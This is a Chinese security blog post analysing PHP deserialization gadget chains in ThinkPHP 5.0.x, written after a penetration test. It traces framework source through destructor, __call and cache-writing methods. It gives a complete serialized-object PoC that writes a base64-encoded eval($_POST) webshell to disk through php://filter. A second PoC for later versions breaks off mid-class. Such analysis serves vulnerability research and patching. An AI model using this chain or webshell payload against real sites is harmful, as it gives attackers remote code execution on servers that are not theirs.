> 原文链接: https://www.anquanke.com//post/id/251318 


# thinkphp5.0.*反序列化链分析（5.0全版本覆盖）


                                阅读量   
                                **22973**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01e0ff0e3aadb81a55.jpg)](https://p5.ssl.qhimg.com/t01e0ff0e3aadb81a55.jpg)



在一次渗透测试中遇到了一个基于Thinkphp5.0.10的站，站点具有非常多的disabled function(phpinfo和scandir等常见函数也在里面)，最终想到的办法是采用反序列化的方法写shell。在网上找了一圈的反序列化的链子没有一个能用的，向上向下都不兼容。这些反序列化链后面写文件的部分都是相同的，但是前面对think\console\Output类中的__call方法的触发方法不尽相同。最终发现，可以将整个thinkphp5.0系列分为两部分，这两个部分具有不同的可通用的反序列化链。一部分是从5.0.0-5.0.3，另一部分则是5.0.4-5.0.24。

本次实验环境Windows+php7.3.4+apache2.4.39



## 1. thinkphp5.0.0-thinkphp5.0.3

下面以版本ThinkPHP V5.0.3 为例进行分析。<br>
在thinkphp的反序列化链中，大部分网上的触发方法都是从think\process\pipes\Windows的__destruct方法出发

```
public function __destruct()
    `{`
        $this-&gt;close();
        $this-&gt;removeFiles();
    `}`

    public function close()
    `{`
        parent::close();
        foreach ($this-&gt;fileHandles as $handle) `{`
            fclose($handle);
        `}`
        $this-&gt;fileHandles = [];
    `}`

    private function removeFiles()
    `{`
        foreach ($this-&gt;files as $filename) `{`
            if (file_exists($filename)) `{`
                @unlink($filename);
            `}`
        `}`
        $this-&gt;files = [];
    `}`
```

在通过file_exists触发think\Model的__toString魔术方法，然后通过__toString方法调用的toJson，toJson调用的toArray，在toArray中触发think\console\Output中的__call方法。

```
public function __toString()
    `{`
        return $this-&gt;toJson();
    `}`

    public function toJson($options = JSON_UNESCAPED_UNICODE)
    `{`
        return json_encode($this-&gt;toArray(), $options);
    `}`
```

但是问题来了<br>
下面是thinkphp5.0.03版本的toArray

```
public function toArray()
    `{`
        $item = [];

        //过滤属性
        if (!empty($this-&gt;visible)) `{`
            $data = array_intersect_key($this-&gt;data, array_flip($this-&gt;visible));
        `}` elseif (!empty($this-&gt;hidden)) `{`
            $data = array_diff_key($this-&gt;data, array_flip($this-&gt;hidden));
        `}` else `{`
            $data = $this-&gt;data;
        `}`

        foreach ($data as $key =&gt; $val) `{`
            if ($val instanceof Model || $val instanceof Collection) `{`
                // 关联模型对象
                $item[$key] = $val-&gt;toArray();
            `}` elseif (is_array($val) &amp;&amp; reset($val) instanceof Model) `{`
                // 关联模型数据集
                $arr = [];
                foreach ($val as $k =&gt; $value) `{`
                    $arr[$k] = $value-&gt;toArray();
                `}`
                $item[$key] = $arr;
            `}` else `{`
                // 模型属性
                $item[$key] = $this-&gt;getAttr($key);
            `}`
        `}`
        // 追加属性（必须定义获取器）
        if (!empty($this-&gt;append)) `{`
            foreach ($this-&gt;append as $name) `{`
                $item[$name] = $this-&gt;getAttr($name);
            `}`
        `}`
        return !empty($item) ? $item : [];
    `}`
```

与之相比，是thinkphp5.0.24的toArray（其实中间的几个版本的toArray也有差别，后面也会提到）

```
public function toArray()
    `{`
        $item    = [];
        $visible = [];
        $hidden  = [];

        $data = array_merge($this-&gt;data, $this-&gt;relation);

        // 过滤属性
        if (!empty($this-&gt;visible)) `{`
            $array = $this-&gt;parseAttr($this-&gt;visible, $visible);
            $data  = array_intersect_key($data, array_flip($array));
        `}` elseif (!empty($this-&gt;hidden)) `{`
            $array = $this-&gt;parseAttr($this-&gt;hidden, $hidden, false);
            $data  = array_diff_key($data, array_flip($array));
        `}`

        foreach ($data as $key =&gt; $val) `{`
            if ($val instanceof Model || $val instanceof ModelCollection) `{`
                // 关联模型对象
                $item[$key] = $this-&gt;subToArray($val, $visible, $hidden, $key);
            `}` elseif (is_array($val) &amp;&amp; reset($val) instanceof Model) `{`
                // 关联模型数据集
                $arr = [];
                foreach ($val as $k =&gt; $value) `{`
                    $arr[$k] = $this-&gt;subToArray($value, $visible, $hidden, $key);
                `}`
                $item[$key] = $arr;
            `}` else `{`
                // 模型属性
                $item[$key] = $this-&gt;getAttr($key);
            `}`
        `}`
        // 追加属性（必须定义获取器）
        if (!empty($this-&gt;append)) `{`
            foreach ($this-&gt;append as $key =&gt; $name) `{`
                if (is_array($name)) `{`
                    // 追加关联对象属性
                    $relation   = $this-&gt;getAttr($key);
                    $item[$key] = $relation-&gt;append($name)-&gt;toArray();
                `}` elseif (strpos($name, '.')) `{`
                    list($key, $attr) = explode('.', $name);
                    // 追加关联对象属性
                    $relation   = $this-&gt;getAttr($key);
                    $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
                `}` else `{`
                    $relation = Loader::parseName($name, 1, false);
                    if (method_exists($this, $relation)) `{`
                        $modelRelation = $this-&gt;$relation();
                        $value         = $this-&gt;getRelationData($modelRelation);

                        if (method_exists($modelRelation, 'getBindAttr')) `{`
                            $bindAttr = $modelRelation-&gt;getBindAttr();
                            if ($bindAttr) `{`
                                foreach ($bindAttr as $key =&gt; $attr) `{`
                                    $key = is_numeric($key) ? $attr : $key;
                                    if (isset($this-&gt;data[$key])) `{`
                                        throw new Exception('bind attr has exists:' . $key);
                                    `}` else `{`
                                        $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
                                    `}`
                                `}`
                                continue;
                            `}`
                        `}`
                        $item[$name] = $value;
                    `}` else `{`
                        $item[$name] = $this-&gt;getAttr($name);
                    `}`
                `}`
            `}`
        `}`
        return !empty($item) ? $item : [];
    `}`
```

可以发现，在5.0.3版本中并没有用来调用任意Model中函数的下列代码

```
if (method_exists($this, $relation)) `{`
        $modelRelation = $this-&gt;$relation();
        $value         = $this-&gt;getRelationData($modelRelation);
        //......
    `}`
```

而且用得都是写死的函数，不存在触发其它类魔术方法的条件。只能从头开始换一条__destruct路线进行分析。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016c89f7720eaa1c5f.png)

一共还有三个的备选项
<li>thinkphp/library/think/process/pipes/Unix.php
<pre><code class="lang-php hljs"> public function __destruct()
 `{`
     $this-&gt;close();
 `}`

 public function close()
 `{`
     foreach ($this-&gt;pipes as $pipe) `{`
         fclose($pipe);
     `}`
     $this-&gt;pipes = [];
 `}`
</code></pre>
不具备可利用性，pass
</li>
<li>thinkphp/library/think/db/Connection.php
<pre><code class="lang-php hljs"> public function __destruct()
 `{`
     // 释放查询
     if ($this-&gt;PDOStatement) `{`
         $this-&gt;free();
     `}`
     // 关闭连接
     $this-&gt;close();
 `}`
`}`
 public function free()
 `{`
     $this-&gt;PDOStatement = null;
 `}`
 public function close()
 `{`
     $this-&gt;linkID = null;
 `}`
</code></pre>
同样不具备可利用性。
</li>
<li>thinkphp/library/think/Process.php
<pre><code class="lang-php hljs"> public function __destruct()
 `{`
     $this-&gt;stop();
 `}`
 public function stop()
 `{`
     if ($this-&gt;isRunning()) `{`
         if ('\\' === DS &amp;&amp; !$this-&gt;isSigchildEnabled()) `{`
             exec(sprintf('taskkill /F /T /PID %d 2&gt;&amp;1', $this-&gt;getPid()), $output, $exitCode);
             if ($exitCode &gt; 0) `{`
                 throw new \RuntimeException('Unable to kill the process');
             `}`
         `}` else `{`
             $pids = preg_split('/\s+/', `ps -o pid --no-heading --ppid `{`$this-&gt;getPid()`}``);
             foreach ($pids as $pid) `{`
                 if (is_numeric($pid)) `{`
                     posix_kill($pid, 9);
                 `}`
             `}`
         `}`
     `}`

     $this-&gt;updateStatus(false);
     if ($this-&gt;processInformation['running']) `{`
         $this-&gt;close();
     `}`

     return $this-&gt;exitcode;
 `}`

 public function isRunning()
 `{`
     if (self::STATUS_STARTED !== $this-&gt;status) `{`
         return false;
     `}`

     $this-&gt;updateStatus(false);

     return $this-&gt;processInformation['running'];
 `}`

 protected function updateStatus($blocking)
 `{`
     if (self::STATUS_STARTED !== $this-&gt;status) `{`
         return;
     `}`

     $this-&gt;processInformation = proc_get_status($this-&gt;process);
     $this-&gt;captureExitCode();

     $this-&gt;readPipes($blocking, '\\' === DS ? !$this-&gt;processInformation['running'] : true);

     if (!$this-&gt;processInformation['running']) `{`
         $this-&gt;close();
     `}`
 `}`

 protected function isSigchildEnabled()
 `{`
     if (null !== self::$sigchild) `{`
         return self::$sigchild;
     `}`

     if (!function_exists('phpinfo')) `{`
         return self::$sigchild = false;
     `}`

     ob_start();
     phpinfo(INFO_GENERAL);

     return self::$sigchild = false !== strpos(ob_get_clean(), '--enable-sigchild');
 `}`

 public function getPid()
 `{`
     if ($this-&gt;isSigchildEnabled()) `{`
         throw new \RuntimeException('This PHP has been compiled with --enable-sigchild. The process identifier can not be retrieved.');
     `}`

     $this-&gt;updateStatus(false);

     return $this-&gt;isRunning() ? $this-&gt;processInformation['pid'] : null;
 `}`

 private function close()
 `{`
     $this-&gt;processPipes-&gt;close();
     if (is_resource($this-&gt;process)) `{`
         $exitcode = proc_close($this-&gt;process);
     `}` else `{`
         $exitcode = -1;
     `}`

     $this-&gt;exitcode = -1 !== $exitcode ? $exitcode : (null !== $this-&gt;exitcode ? $this-&gt;exitcode : -1);
     $this-&gt;status   = self::STATUS_TERMINATED;

     if (-1 === $this-&gt;exitcode &amp;&amp; null !== $this-&gt;fallbackExitcode) `{`
         $this-&gt;exitcode = $this-&gt;fallbackExitcode;
     `}` elseif (-1 === $this-&gt;exitcode &amp;&amp; $this-&gt;processInformation['signaled']
               &amp;&amp; 0 &lt; $this-&gt;processInformation['termsig']
     ) `{`
         $this-&gt;exitcode = 128 + $this-&gt;processInformation['termsig'];
     `}`

     return $this-&gt;exitcode;
 `}`
</code></pre>
<p>注意到，只要是有了proc_get_status的地方就会触发app error，因为我们无法序列化resource对象（我个人测试是这样，如果大佬有方法还请赐教）。这样一看上面除了close方法，就没啥利用点了。而且close方法的第一行就可以触发任意类的__call魔术方法或者任意类的close方法。<br>
看下close方法<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01dc5d47c92ff9ed8d.png)<br>
发现都没啥利用价值。不是没有利用的地方，就是和这里的close触发点没有区别。<br>
直奔think\console\Output类中的__call魔术方法，企图一步到位。这时候遇到的只能是app error，因为其中的block方法需要2个参数。</p>
<pre><code class="lang-php hljs"> public function __call($method, $args)
 `{`
     if (in_array($method, $this-&gt;styles)) `{`
         array_unshift($args, $method);
         return call_user_func_array([$this, 'block'], $args);
     `}`

     if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) `{`
         return call_user_func_array([$this-&gt;handle, $method], $args);
     `}` else `{`
         throw new Exception('method not exists:' . __CLASS__ . '-&gt;' . $method);
     `}`
 `}`
 protected function block($style, $message)
 `{`
     $this-&gt;writeln("&lt;`{`$style`}`&gt;`{`$message`}`&lt;/$style&gt;");
 `}`
 public function writeln($messages, $type = self::OUTPUT_NORMAL)
 `{`
     $this-&gt;write($messages, true, $type);
 `}`
</code></pre>
那么这边就需要找另一个类的__call魔术方法做跳板，最终发现think\model\Relation是所有__call中利用最方便的（其它的__call我没找到能无条件利用的）
<pre><code class="lang-php hljs"> public function __call($method, $args)
 `{`
     if ($this-&gt;query) `{`
         switch ($this-&gt;type) `{`
             case self::HAS_MANY:
                 if (isset($this-&gt;where)) `{`
                     $this-&gt;query-&gt;where($this-&gt;where);
                 `}` elseif (isset($this-&gt;parent-&gt;`{`$this-&gt;localKey`}`)) `{`
                     // 关联查询带入关联条件
                     $this-&gt;query-&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;`{`$this-&gt;localKey`}`);
                 `}`
                 break;
             case self::HAS_MANY_THROUGH:
                 $through      = $this-&gt;middle;
                 $model        = $this-&gt;model;
                 $alias        = Loader::parseName(basename(str_replace('\\', '/', $model)));
                 $throughTable = $through::getTable();
                 $pk           = (new $this-&gt;model)-&gt;getPk();
                 $throughKey   = $this-&gt;throughKey;
                 $modelTable   = $this-&gt;parent-&gt;getTable();
                 $this-&gt;query-&gt;field($alias . '.*')-&gt;alias($alias)
                     -&gt;join($throughTable, $throughTable . '.' . $pk . '=' . $alias . '.' . $throughKey)
                     -&gt;join($modelTable, $modelTable . '.' . $this-&gt;localKey . '=' . $throughTable . '.' . $this-&gt;foreignKey)
                     -&gt;where($throughTable . '.' . $this-&gt;foreignKey, $this-&gt;parent-&gt;`{`$this-&gt;localKey`}`);
                 break;
             case self::BELONGS_TO_MANY:
                 // TODO

         `}`
         $result = call_user_func_array([$this-&gt;query, $method], $args);
         if ($result instanceof \think\db\Query) `{`
             $this-&gt;option = $result-&gt;getOptions();
             return $this;
         `}` else `{`
             $this-&gt;option = [];
             return $result;
         `}`
     `}` else `{`
         throw new Exception('method not exists:' . __CLASS__ . '-&gt;' . $method);
     `}`
 `}`
</code></pre>
不用管其它的，单单是这句，我们就已经有了良好的跳板了
<pre><code class="lang-php hljs"> $this-&gt;query-&gt;where($this-&gt;where);
</code></pre>
<p>$this-&gt;query和$this-&gt;where均可控，这时候再触发Output中的__call就不会有app error了。<br>
继续跟进，对Output中最后触发的write方法进行查看</p>
<pre><code class="lang-php hljs"> public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
 `{`
     $this-&gt;handle-&gt;write($messages, $newline, $type);
 `}`
</code></pre>
<p>通过这个方法，我们可以调用任意类的write（这边也不用考虑触发__call魔术方法了）。生成的文件要内容可控，且文件的后缀是php。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01be230126f77989c9.png)<br>
在众多的write方法中，最后认为只有think\session\driver\Memcache和think\session\driver\Memcached利用价值较大。</p>
<pre><code class="lang-php hljs">//thinkphp/library/think/session/driver/Memcached.php
 public function write($sessID, $sessData)
 `{`
     return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);
 `}`
</code></pre>
<pre><code class="lang-php hljs">//thinkphp/library/think/session/driver/Memcache.php
 public function write($sessID, $sessData)
 `{`
     return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, 0, $this-&gt;config['expire']);
 `}`
</code></pre>
继续寻找，含有set的方法的类，到这边，网上已经有很多分析过的文章了，这边就简单写一下路径，不细说了，为了在Windows下也能稳定使用，这里先用think\cache\driver\Memcached做过渡，然后将其中的$this-&gt;handler赋值为think\cache\driver\File类的实例。
<pre><code class="lang-php hljs">//think\cache\Driver
 protected function setTagItem($name)
 `{`
     if ($this-&gt;tag) `{`
         $key       = 'tag_' . md5($this-&gt;tag);
         $this-&gt;tag = null;
         if ($this-&gt;has($key)) `{`
             $value = $this-&gt;get($key);
             $value .= ',' . $name;
         `}` else `{`
             $value = $name;
         `}`
         $this-&gt;set($key, $value);
     `}`
 `}`

 protected function getCacheKey($name)
 `{`
     return $this-&gt;options['prefix'] . $name;
 `}`
</code></pre>
<pre><code class="lang-php hljs">//think\cache\driver\Memcached
 public function set($name, $value, $expire = null)
 `{`
     if (is_null($expire)) `{`
         $expire = $this-&gt;options['expire'];
     `}`
     if ($this-&gt;tag &amp;&amp; !$this-&gt;has($name)) `{`
         $first = true;
     `}`
     $key    = $this-&gt;getCacheKey($name);
     $expire = 0 == $expire ? 0 : $_SERVER['REQUEST_TIME'] + $expire;
     if ($this-&gt;handler-&gt;set($key, $value, $expire)) `{`
         isset($first) &amp;&amp; $this-&gt;setTagItem($key);
         return true;
     `}`
     return false;
 `}`
</code></pre>
<pre><code class="lang-php hljs">//think\cache\driver\File
 public function set($name, $value, $expire = null)
 `{`
     if (is_null($expire)) `{`
         $expire = $this-&gt;options['expire'];
     `}`
     $filename = $this-&gt;getCacheKey($name);
     if ($this-&gt;tag &amp;&amp; !is_file($filename)) `{`
         $first = true;
     `}`
     $data = serialize($value);
     if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) `{`
         //数据压缩
         $data = gzcompress($data, 3);
     `}`
     $data   = "&lt;?php\n//" . sprintf('%012d', $expire) . $data . "\n?&gt;";
     $result = file_put_contents($filename, $data);
     if ($result) `{`
         isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
         clearstatcache();
         return true;
     `}` else `{`
         return false;
     `}`
 `}`

 protected function getCacheKey($name)
 `{`
     $name = md5($name);
     if ($this-&gt;options['cache_subdir']) `{`
         // 使用子目录
         $name = substr($name, 0, 2) . DS . substr($name, 2);
     `}`
     if ($this-&gt;options['prefix']) `{`
         $name = $this-&gt;options['prefix'] . DS . $name;
     `}`
     $filename = $this-&gt;options['path'] . $name . '.php';
     $dir      = dirname($filename);
     if (!is_dir($dir)) `{`
         mkdir($dir, 0755, true);
     `}`
     return $filename;
 `}`
</code></pre>
<p>通过构造base64字符串，再进过伪协议解码后成功写入文件。具体的分析可以参考[https://xz.aliyun.com/t/7310。](https://xz.aliyun.com/t/7310%E3%80%82)<br>
结果展示：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01870d8255f7077976.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013d73469f1f177d15.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0196e2ca357e004b02.png)</p>
</li>
poc

```
&lt;?php
namespace think;


class Process
`{`
    private $processPipes;

    private $status;

    private $processInformation;
    public function  __construct()`{`
        $this-&gt;processInformation['running']=true;
        $this-&gt;status=3;
        $this-&gt;processPipes=new \think\model\Relation();
    `}`

`}`
namespace think\model;

use think\console\Output;

class Relation
`{`
    protected $query;
    const HAS_ONE          = 1;
    const HAS_MANY         = 2;
    const HAS_MANY_THROUGH = 5;
    const BELONGS_TO       = 3;
    const BELONGS_TO_MANY  = 4;
    protected $type=2;
    protected $where=1;
    public function __construct()
    `{`
        $this-&gt;query=new Output();
    `}`
`}`


namespace think\console;
class Output`{`
    protected $styles = [
        'info',
        'error',
        'comment',
        'question',
        'highlight',
        'warning',
        'getTable',
        'where'
    ];
    private $handle;
    public function __construct()
    `{`
        $this-&gt;handle = (new \think\session\driver\Memcache);
    `}`
`}`
namespace think\session\driver;
class Memcache
`{`
    protected $handler;
    public function __construct()
    `{`
        $this-&gt;handler = (new \think\cache\driver\Memcached);
    `}`
`}`


namespace think\cache\driver;

use think\Process;

class Memcached
`{`
    protected $tag;
    protected $options;
    protected $handler;

    public function __construct()
    `{`
        $this-&gt;tag = true;
        $this-&gt;options = [
            'expire'   =&gt; 0,
            'prefix'   =&gt; 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
        ];
        $this-&gt;handler = (new File);
    `}`
`}`

class File
`{`
    protected $tag;
    protected $options;
    public function __construct()
    `{`
        $this-&gt;tag = false;
        $this-&gt;options = [
            'expire'        =&gt; 3600,
            'cache_subdir'  =&gt; false,
            'prefix'        =&gt; '',
            'data_compress' =&gt; false,
            'path'          =&gt; 'php://filter/convert.base64-decode/resource=./',
        ];
    `}`
`}`
use think;
$a=new Process();
echo urlencode(serialize($a));
```



## 2. thinkphp5.0.4-thinkphp5.0.24

首先要注意的一个变化是以往的利用的Relation类变为了抽象了，无法直接实例化。所以前面的链子到这边也就断了。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01d09b9f04a3a59bcd.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a291104e0b0448d8.png)

下面的审计以thinkphp5.0.10为例，因为这个版本很奇葩，别的版本的poc在它这一直行不通，向上也不兼容，向下也不兼容。如果能在该版本下使用poc大概率是能覆盖thinkphp5.0.4-thinkphp5.0.24的。

还是先看最老的套路能不能行的通，走Window下的__destruct触发Model类的__toString。看下该版本的Model类的toArray方法（前面的过程没有任何变化）

```
public function toArray()
    `{`
        $item    = [];
        $visible = [];
        $hidden  = [];

        $data = array_merge($this-&gt;data, $this-&gt;relation);

        // 过滤属性
        if (!empty($this-&gt;visible)) `{`
            $array = $this-&gt;parseAttr($this-&gt;visible, $visible);
            $data  = array_intersect_key($data, array_flip($array));
        `}` elseif (!empty($this-&gt;hidden)) `{`
            $array = $this-&gt;parseAttr($this-&gt;hidden, $hidden, false);
            $data  = array_diff_key($data, array_flip($array));
        `}`

        foreach ($data as $key =&gt; $val) `{`
            if ($val instanceof Model || $val instanceof ModelCollection) `{`
                // 关联模型对象
                $item[$key] = $this-&gt;subToArray($val, $visible, $hidden, $key);
            `}` elseif (is_array($val) &amp;&amp; reset($val) instanceof Model) `{`
                // 关联模型数据集
                $arr = [];
                foreach ($val as $k =&gt; $value) `{`
                    $arr[$k] = $this-&gt;subToArray($value, $visible, $hidden, $key);
                `}`
                $item[$key] = $arr;
            `}` else `{`
                // 模型属性
                $item[$key] = $this-&gt;getAttr($key);
            `}`
        `}`
        // 追加属性（必须定义获取器）
        if (!empty($this-&gt;append)) `{`
            foreach ($this-&gt;append as $key =&gt; $name) `{`
                if (is_array($name)) `{`
                    // 追加关联对象属性
                    $relation   = $this-&gt;getAttr($key);
                    $item[$key] = $relation-&gt;append($name)-&gt;toArray();
                `}` elseif (strpos($name, '.')) `{`
                    list($key, $attr) = explode('.', $name);
                    // 追加关联对象属性
                    $relation   = $this-&gt;getAttr($key);
                    $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
                `}` else `{`
                    $item[$name] = $this-&gt;getAttr($name);
                `}`
            `}`
        `}`
        return !empty($item) ? $item : [];
    `}`

    public function getAttr($name)
    `{`
        try `{`
            $notFound = false;
            $value    = $this-&gt;getData($name);
        `}` catch (InvalidArgumentException $e) `{`
            $notFound = true;
            $value    = null;
        `}`

        // 检测属性获取器
        $method = 'get' . Loader::parseName($name, 1) . 'Attr';
        if (method_exists($this, $method)) `{`
            $value = $this-&gt;$method($value, $this-&gt;data, $this-&gt;relation);
        `}` elseif (isset($this-&gt;type[$name])) `{`
            // 类型转换
            $value = $this-&gt;readTransform($value, $this-&gt;type[$name]);
        `}` elseif (in_array($name, [$this-&gt;createTime, $this-&gt;updateTime])) `{`
            if (is_string($this-&gt;autoWriteTimestamp) &amp;&amp; in_array(strtolower($this-&gt;autoWriteTimestamp), [
                'datetime',
                'date',
                'timestamp',
            ])
            ) `{`
                $value = $this-&gt;formatDateTime(strtotime($value), $this-&gt;dateFormat);
            `}` else `{`
                $value = $this-&gt;formatDateTime($value, $this-&gt;dateFormat);
            `}`
        `}` elseif ($notFound) `{`
            $relation = Loader::parseName($name, 1, false);
            if (method_exists($this, $relation)) `{`
                $modelRelation = $this-&gt;$relation();
                // 不存在该字段 获取关联数据
                $value = $this-&gt;getRelationData($modelRelation);
                // 保存关联对象值
                $this-&gt;relation[$name] = $value;
            `}` else `{`
                throw new InvalidArgumentException('property not exists:' . $this-&gt;class . '-&gt;' . $name);
            `}`
        `}`
        return $value;
    `}`

    public function getData($name = null)
    `{`
        if (is_null($name)) `{`
            return $this-&gt;data;
        `}` elseif (array_key_exists($name, $this-&gt;data)) `{`
            return $this-&gt;data[$name];
        `}` elseif (array_key_exists($name, $this-&gt;relation)) `{`
            return $this-&gt;relation[$name];
        `}` else `{`
            throw new InvalidArgumentException('property not exists:' . $this-&gt;class . '-&gt;' . $name);
        `}`
    `}`
```

仔细观察发现，如果我们能够正常进入if (!empty($this-&gt;append))`{`…`}`分支，通过getData，我们可以实例化其它类，从而调用其它类具有的append方法或者__call魔术方法。而且可控变量很多，$this-&gt;append不为空，将需要实例化的类放入$this-&gt;data或者$this-&gt;relation，跳过getAttr方法中所有可能遇到的类型转换即可。最终将$this-&gt;append数组中的对应值修改成数组即可进入下列语句：

```
$relation   = $this-&gt;getAttr($key);
    $item[$key] = $relation-&gt;append($name)-&gt;toArray();
```

在审计到这时，似乎已经可以触发前面所提到的think\console\Output类的__call了，而且也具有参数。但是在实际过程中，又走到了一生之敌的app error。希望的参数是string类型，给的却是数组。那么如果__call方法不能用的话，是不是可以看看有没有其它类中的append方法，可以做跳板呢。

[![](https://p0.ssl.qhimg.com/t01aa0318bb50f0504c.png)](https://p0.ssl.qhimg.com/t01aa0318bb50f0504c.png)

具有append方法的类并不多，只有两个，一个是Model一个是Collection，跟进查看

```
//Model
    public function append($append = [], $override = false)
    `{`
        $this-&gt;append = $override ? $append : array_merge($this-&gt;append, $append);
        return $this;
    `}`
```

不存在利用点

```
public function append($append = [], $override = false)
    `{`
        $this-&gt;each(function ($model) use ($append, $override) `{`
            /** @var Model $model */
            $model-&gt;append($append, $override);
        `}`);
        return $this;
    `}`
```

这边的参数仍然会是数组，依旧不能直接触发think\console\Output类的__call。同样查看其它类的__call也存在类似问题，所以这条反序列化的链子似乎已经走到死胡同了。但是在已经成为了抽象类的Relation却带来了新的利用方式，但是现在的Relation的__call方法和之前也不大一样了。

```
abstract protected function baseQuery();

    public function __call($method, $args)
    `{`
        if ($this-&gt;query) `{`
            // 执行基础查询
            $this-&gt;baseQuery();

            $result = call_user_func_array([$this-&gt;query, $method], $args);
            if ($result instanceof Query) `{`
                return $this;
            `}` else `{`
                $this-&gt;baseQuery = false;
                return $result;
            `}`
        `}` else `{`
            throw new Exception('method not exists:' . __CLASS__ . '-&gt;' . $method);
        `}`
    `}`
`}`
```

按照之前的分析来看，下面的call_user_func_array是无法有效利用的，所以如果要想找跳板的话，必然是利用了baseQuery方法。

[![](https://p0.ssl.qhimg.com/t01251cf6558ee40273.png)](https://p0.ssl.qhimg.com/t01251cf6558ee40273.png)

查看后发现触发条件最简单的是think\model\relation\HasMany类中的baseQuery方法。

```
protected function baseQuery()
    `{`
        if (empty($this-&gt;baseQuery)) `{`
            if (isset($this-&gt;parent-&gt;`{`$this-&gt;localKey`}`)) `{`
                // 关联查询带入关联条件
                $this-&gt;query-&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;`{`$this-&gt;localKey`}`);
            `}`
            $this-&gt;baseQuery = true;
        `}`
    `}`
```

具有可控参数和触发__call的条件。后面就算将$this-&gt;query赋值为think\console\Output类实例，然后和前面低版本的一样触发就行。但是这个还存在一个问题。因为前面触发的toArray的if (!empty($this-&gt;append))`{`…`}`分支是在thinkphp5.0.05（包括5.0.05）之后才存在的。也就是说这条链子在thinkphp5.0.04版本是行不通的。这时候我们想起了之前对于thinkphp5.0.03版本的反序列化链的挖掘。

和前面低版本的链子一样，直接触发__call方法，但是此时的Relation已经是抽象类了，无法作为跳板利用。结合之前的分析，这边我们采用think\model\relation\HasMany作为跳板进行构造。和低版本相比，除了中间利用了Relation类的子类作为跳板之外，其它地方没有任何区别。<br>
poc

```
namespace think;


use think\model\relation\HasMany;

class Process
`{`
    private $processPipes;

    private $status;

    private $processInformation;
    public function  __construct()`{`
        $this-&gt;processInformation['running']=true;
        $this-&gt;status=3;
        $this-&gt;processPipes=new HasMany();
    `}`

`}`
 namespace think;
 class Model`{`

 `}`
 namespace think\model;


 use think\Model;
 class Merge extends Model`{`
     public $a='1';
     public function __construct()
     `{`
     `}`
 `}`



namespace think\model\relation;
use think\console\Output;
use think\db\Query;
use think\model\Merge;
use think\model\Relation;
class HasMany extends Relation
`{`
    //protected $baseQuery=true;
    protected $parent;
    protected $localKey='a';
    protected $foreignKey='a';
    protected $pivot;
    public function __construct()`{`
        $this-&gt;query=new Output();
        $this-&gt;parent= new Merge();

    `}`
`}`


namespace think\model;
class Relation
`{``}`
namespace think\db;
class Query`{``}`


namespace think\console;
class Output`{`
    protected $styles = [
        'info',
        'error',
        'comment',
        'question',
        'highlight',
        'warning',
        'getTable',
        'where'
    ];
    private $handle;
    public function __construct()
    `{`
        $this-&gt;handle = (new \think\session\driver\Memcache);
    `}`
`}`
namespace think\session\driver;
class Memcache
`{`
    protected $handler;
    public function __construct()
    `{`
